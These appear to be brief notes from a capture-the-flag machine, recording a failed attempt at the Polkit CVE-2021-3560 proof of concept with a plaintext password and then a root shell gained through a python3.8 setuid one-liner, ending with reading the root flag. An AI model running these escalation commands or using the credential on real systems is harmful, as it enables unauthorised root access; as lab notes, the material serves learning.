CVE-2021-3560 - Polkit-Privilege-Esclation
uploaded poc.sh to the host via scp route
running bash poc.sh -u=nathan -p=Buck3tH4TF0RM3!
this runs into an error, [x] ERROR: Accounts service and Gnome-Control-Center NOT found!!
moving on to /usr/bin/python3.8 vuln for now

/usr/bin/python3.8
using python3.8, we are able to import os and set the uid to 0 (root)
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
This gets us root access
cat /root/root.txt
